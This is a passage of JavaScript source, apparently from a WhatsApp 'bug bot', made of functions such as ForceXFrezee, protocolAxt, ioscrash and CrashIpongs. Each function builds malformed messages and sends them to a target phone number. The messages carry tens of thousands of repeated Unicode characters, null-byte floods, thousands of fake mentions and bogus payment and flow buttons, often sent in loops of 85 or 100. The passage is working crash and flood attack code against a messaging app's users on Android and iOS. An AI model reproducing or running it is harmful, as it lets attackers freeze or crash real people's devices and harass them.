                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });

    await axata.relayMessage("status@broadcast", Payment_Info.message, {
        messageId: Payment_Info.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

// -----------------( END FUNCTION BULDOZER )--------------------- \\



// -----------------( FUNCTION FORCE CLICK X CLICK )--------------------- \\

async function ForceXFrezee(target) {
    let crash = JSON.stringify({
        action: "x",
        data: "x"
    });

    await axata.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "🩸YT JustinOfficial-ID" + "ꦾ".repeat(77777),
            publisher: "JustinV22 Vip",
            stickers: [{
                    fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "Jawa Jawa",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                },
                {
                    fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
                    isAnimated: false,
                    emojis: [""],
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                }
            ],
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                    "6285215587498@s.whatsapp.net",
                    ...Array.from({
                            length: 1900
                        }, () =>
                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                    )
                ]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "3680054",
            stickerPackOrigin: "USER_CREATED",
            quotedMessage: {
                callLogMesssage: {
                    isVideo: true,
                    callOutcome: "REJECTED",
                    durationSecs: "1",
                    callType: "SCHEDULED_CALL",
                    participants: [{
                            jid: target,
                            callOutcome: "CONNECTED"
                        },
                        {
                            target: "0@s.whatsapp.net",
                            callOutcome: "REJECTED"
                        },
                        {
                            target: "13135550002@s.whatsapp.net",
                            callOutcome: "ACCEPTED_ELSEWHERE"
                        },
                        {
                            target: "status@broadcast",
                            callOutcome: "SILENCED_UNKNOWN_CALLER"
                        },
                    ]
                }
            },
        }
    }, {});

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessageV2: {
            message: {
                listResponseMessage: {
                    title: "🩸YT JustinOfficial-ID" + "ꦾ",
                    listType: 4,
                    buttonText: {
                        displayText: "🩸"
                    },
                    sections: [],
                    singleSelectReply: {
                        selectedRowId: "⌜⌟"
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        participant: "0@s.whatsapp.net",
                        remoteJid: "who know's ?",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 1,
                                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                            }
                        },
                        externalAdReply: {
                            title: "☀️",
                            body: "🩸",
                            mediaType: 1,
                            renderLargerThumbnail: false,
                            nativeFlowButtons: [{
                                    name: "payment_info",
                                    buttonParamsJson: crash
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: crash
                                },
                            ],
                        },
                        extendedTextMessage: {
                            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
                            contextInfo: {
                                stanzaId: target,
                                participant: target,
                                quotedMessage: {
                                    conversation: "🩸YT JustinOfficial-ID" +
                                        "ꦾ࣯࣯".repeat(50000) +
                                        "@1".repeat(20000),
                                },
                                disappearingMode: {
                                    initiator: "CHANGED_IN_CHAT",
                                    trigger: "CHAT_SETTING",
                                },
                            },
                            inviteLinkGroupTypeV2: "DEFAULT",
                        },
                        participant: target,
                    }
                }
            }
        }
    }, {})
    await axata.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
    console.log(chalk.red(`Succes Send Bug To ${target}`));
}

// ------------------ ( END FUNTION FORCE CLIC ) ------------------------ \\


// ------------------ ( FUNTION PROTOCOL ) ------------------------ \\
async function protocolAxt(target, mention) {
  for (let p = 0; p < 85; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await axata.relayMessage(target, PouMsg.message, {
      messageId: PouMsg.key.id
    });

  }
}

async function protocolbug(target, mention) {
  for (let p = 0; p < 85; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await axata.relayMessage(target, {
      groupStatusMessageV2: {
        participant: { jid: target },
        messageId: PouMsg.key.id
      }
    });

  }
}

async function Axtprotocol(target, mention) {
  for (let p = 0; p < 85; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await axata.relayMessage("status@broadcast", PouMsg.message, {
      messageId: PouMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await axata.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: PouMsg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "#PouMods Official" },
                content: undefined
              }
            ]
          }
        }
      }, {});
    }

  }
}

// ------------------ ( END FUNTION PORTOCOL ) ------------------------ \\


// -----------------( FUNCTION IPONGS )--------------------- \\

async function ioscrash(target) {
  let msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      contextInfo: {
        statusAttributionType: "RESHARED_FROM_POST"
      }, 
      text: "🩸 YT JustinOfficial-ID" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      matchedText: "t.me/justinoffc", 
      groupInviteLinkType: "DEFAULT"
    }
  }, {});
  
  await axata.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid:target },
  });
}

async function Delayipongs(axata, target) {

await axata.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}      

async function crashNewIos(axata, target) {
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await axata.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        mentionedJid: mentionedJids, 
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}

async function iosinVisFC3(axata, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/AXATA",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "AXATA",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await axata.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await axata.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await axata.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await axata.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await axata.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 6000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function CrashIpongs(axata, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://xrelly-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
